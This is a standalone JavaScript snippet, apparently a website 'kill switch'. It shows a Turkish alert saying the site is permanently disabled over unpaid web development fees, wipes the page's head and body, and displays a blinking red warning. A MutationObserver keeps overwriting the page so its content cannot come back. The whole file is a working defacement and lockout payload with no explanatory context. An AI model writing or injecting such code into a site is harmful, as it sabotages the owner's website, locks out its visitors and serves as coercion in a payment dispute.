alert("UYARI: Bu site ÖDENMEMİŞ WEB GELİŞTİRME ÜCRETLERİ nedeniyle KALICI OLARAK DEVRE DIŞI BIRAKILDI!");

document.body.innerHTML = "";
document.head.innerHTML = "";

document.write(`
  <style>
    html, body {
      background-color: #000;
      margin: 0;
      height: 100%;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
    }
    h1 {
      color: #f00;
      font-size: 3rem;
      text-align: center;
      text-transform: uppercase;
      animation: blink 1s infinite;
      max-width: 90%;
    }
    @keyframes blink {
      0%   { opacity: 1; }
      50%  { opacity: 0; }
      100% { opacity: 1; }
    }
  </style>
  <h1>UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!</h1>
`);

new MutationObserver(() => {
  document.body.innerHTML = `
    <h1 style="
      color:#f00;
      background-color:#000;
      margin:0;
      height:100vh;
      overflow:hidden;
      display:flex;
      justify-content:center;
      align-items:center;
      font-family:Arial,sans-serif;
      text-align:center;
      font-size:3rem;
      text-transform:uppercase;
      animation: blink 1s infinite;
    ">
      UYARI! BU SİTE ÖDENMEMİŞ GELİŞTİRME ÜCRETLERİ NEDENİYLE DEVRE DIŞI BIRAKILDI!
    </h1>
    <style>
      @keyframes blink {
        0%   { opacity: 1; }
        50%  { opacity: 0; }
        100% { opacity: 1; }
      }
    </style>
  `;
}).observe(document.documentElement, { childList: true, subtree: true });
